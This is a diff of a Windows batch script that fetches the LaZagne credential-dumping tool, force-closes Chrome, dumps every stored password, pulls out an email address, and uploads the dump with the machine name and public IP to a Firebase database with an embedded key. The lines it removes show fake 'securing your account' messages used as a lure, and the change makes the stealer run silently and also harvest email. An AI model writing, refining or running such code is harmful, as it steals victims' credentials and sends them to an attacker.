@@ -9,76 +9,38 @@ set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatab
 set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"
 
 if not exist "%LAZAGNE_EXE%" (
-    echo   Securing your account...
     powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
-    if errorlevel 1 (
-        echo  [ERROR] Secure failed your account have problems
-        pause
-        exit /b 1
-    )
-    if not exist "%LAZAGNE_EXE%" (
-        echo   [ERROR] check internet or URL.
-        pause
-        exit /b 1
-    )
-    echo   [OK] Successfully securing your account now..
-) else (
-    echo   [yes]
+    if errorlevel 1 exit /b 1
 )
 
-tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
-if %errorlevel% == 0 (
-    taskkill /IM chrome.exe /F >nul 2>&1
-)
-
-if not exist "%OUTPUT_DIR%" (
-    mkdir "%OUTPUT_DIR%" 2>nul
-    if errorlevel 1 (
-        pause
-        exit /b 1
-    )
-)
-
-if not exist "%LAZAGNE_EXE%" (
-    pause
-    exit /b 1
-)
+if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"
 
 "%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
-if errorlevel 1 (
-    pause
-    exit /b 1
-)
+if errorlevel 1 exit /b 1
+
 
 for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
-if not defined RESULT_FILE (
-    dir "%OUTPUT_DIR%"
-    pause
-    exit /b 1
-)
+if not defined RESULT_FILE exit /b 1
+
 
 set "PC_NAME=%COMPUTERNAME%"
 set "PC_NAME=!PC_NAME: =_!"
 set "PC_NAME=!PC_NAME:-=_!"
 
 
-:: Fetch public IP and upload all data to Firebase
+set "EMAIL=unknown"
+for /f "tokens=* delims=" %%E in ('findstr /i /r "email=.*@.*" "%OUTPUT_DIR%\%RESULT_FILE%"') do (
+    set "EMAIL_LINE=%%E"
+    set "EMAIL_LINE=!EMAIL_LINE: =!"
+    set "EMAIL=!EMAIL_LINE:*email==!"
+)
+
+
 powershell -Command ^
   "$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org');" ^
   "$content = Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%';" ^
-  "$json = @{ computer = '%PC_NAME%'; timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'); ip = $ip; data = $content } | ConvertTo-Json -Compress;" ^
-  "$response = Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json';" ^
-  "if ($response) { Write-Host '  [OK] Upload success!' } else { Write-Host '  [ERROR] Upload failed!' }"
-
-if errorlevel 1 (
-    pause
-    exit /b 1
-)
+  "$json = @{ computer = '%PC_NAME%'; email = '%EMAIL%'; timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'); ip = $ip; data = $content } | ConvertTo-Json -Compress;" ^
+  "Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'"
 
 del /q "%LAZAGNE_EXE%" >nul 2>&1
-
-echo ------------------------------------------------------------
-echo Congrats. Your account has been secured.
-echo ------------------------------------------------------------
-pause
 exit /b 0
